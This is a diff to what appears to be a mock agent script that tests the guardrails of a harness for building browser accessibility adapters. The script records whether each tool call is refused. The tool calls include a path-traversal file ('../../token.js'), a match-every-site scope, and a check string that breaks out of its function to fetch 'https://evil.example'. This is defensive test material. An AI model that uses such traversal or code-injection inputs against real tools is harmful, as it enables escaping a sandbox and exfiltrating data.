@@ -20,7 +20,8 @@ async function tool(name, args) {
 out({ type: 'step_start', part: { type: 'step-start' } });
 if (/hang/.test(message)) { await new Promise(() => {}); }
 if (/build/.test(message)) {
-  out({ type: 'tool_use', part: { id: 'p1', type: 'tool', tool: 'read', state: { status: 'completed', input: { filePath: '/toolkit/.claude/skills/ai4a11y-toolkit/SKILL.md' }, output: 'SECRET FILE TEXT' } } });
+  // Two reads in a row: the sidebar folds them into one line.
+  for (const id of ['p1', 'p1b']) out({ type: 'tool_use', part: { id, type: 'tool', tool: 'read', state: { status: 'completed', input: { filePath: '/toolkit/.claude/skills/ai4a11y-toolkit/SKILL.md' }, output: 'SECRET FILE TEXT' } } });
   const page = await tool('browser_page', { reason: 'To see which buttons are small.' });
   // Runs on the site the person shared, like the agent would choose.
   const address = /Address: (\S+)/.exec(page.content[0].text)?.[1];
@@ -29,10 +30,22 @@ if (/build/.test(message)) {
   mkdirSync('adapters', { recursive: true });
   writeFileSync('adapters/bigger-buttons.js', 'export const BiggerButtons = { enable() { document.body.dataset.big = "1"; }, disable() { delete document.body.dataset.big; } };\n');
   out({ type: 'tool_use', part: { id: 'p3', type: 'tool', tool: 'write', state: { status: 'completed', input: { filePath: '/work/adapters/bigger-buttons.js', content: 'export const …' } } } });
-  const outside = await tool('browser_preview', { file: '../../token.js', name: 'x', runs_on: ['https://example.com/*'] });
-  const preview = await tool('browser_preview', { file: 'adapters/bigger-buttons.js', name: 'Bigger buttons', runs_on: runsOn });
-  const ready = await tool('adapter_ready', { file: 'adapters/bigger-buttons.js', id: 'bigger-buttons', name: 'Bigger buttons', about: 'Makes buttons bigger.', runs_on: runsOn, support_areas: ['motor'] });
-  out({ type: 'text', part: { id: 'p4', type: 'text', text: `Done.\n\`\`\`js\nexport const BiggerButtons = {}\n\`\`\`\nOutside: ${outside.isError ? 'refused' : 'allowed'}. Preview: ${preview.content[0].text.split('\n')[0]} Ready: ${ready.isError ? 'no' : 'yes'}.` } });
+  const checks = [{ name: 'the page is marked big', code: 'return document.body.dataset.big === "1";' }];
+  const ready = (o = {}) => tool('adapter_ready', { file: 'adapters/bigger-buttons.js', id: 'bigger-buttons', name: 'Bigger buttons', about: 'Makes buttons bigger.', runs_on: runsOn, support_areas: ['motor'], ...o });
+  const early = await ready();
+  const outside = await tool('browser_preview', { file: '../../token.js', name: 'x', runs_on: ['https://example.com/*'], checks });
+  const everywhere = await tool('browser_preview', { file: 'adapters/bigger-buttons.js', name: 'Bigger buttons', runs_on: ['https://*/*'], checks });
+  const unchecked = await tool('browser_preview', { file: 'adapters/bigger-buttons.js', name: 'Bigger buttons', runs_on: runsOn, checks: [] });
+  const escape = await tool('browser_preview', { file: 'adapters/bigger-buttons.js', name: 'Bigger buttons', runs_on: runsOn, checks: [{ name: 'x', code: 'return 1; }); fetch("https://evil.example"); (async () => {' }] });
+  const preview = await tool('browser_preview', { file: 'adapters/bigger-buttons.js', name: 'Bigger buttons', runs_on: runsOn, checks });
+  const done = await ready();
+  const verdict = (r) => (r.isError ? 'refused' : 'allowed');
+  out({ type: 'text', part: { id: 'p4', type: 'text', text: `Done.\n\`\`\`js\nexport const BiggerButtons = {}\n\`\`\`\nEarly: ${verdict(early)}. Outside: ${verdict(outside)}. Everywhere: ${verdict(everywhere)}. Unchecked: ${verdict(unchecked)}. Escape: ${verdict(escape)}. Preview: ${preview.content[0].text.split('\n')[0]} Changed: ${/enable\(\) made \d+ changes/.test(preview.content[0].text) ? 'yes' : 'no'}. Ready: ${done.isError ? 'no' : 'yes'}.` } });
+} else if (/sketch/.test(message)) {
+  // Writes an adapter and stops without previewing it.
+  mkdirSync('adapters', { recursive: true });
+  writeFileSync('adapters/sketch.js', 'export const Sketch = { enable() {}, disable() {} };\n');
+  out({ type: 'text', part: { id: 'p1', type: 'text', text: 'Here is a sketch.' } });
 } else {
   out({ type: 'text', part: { id: 'p1', type: 'text', text: `You said: ${message}` } });
 }
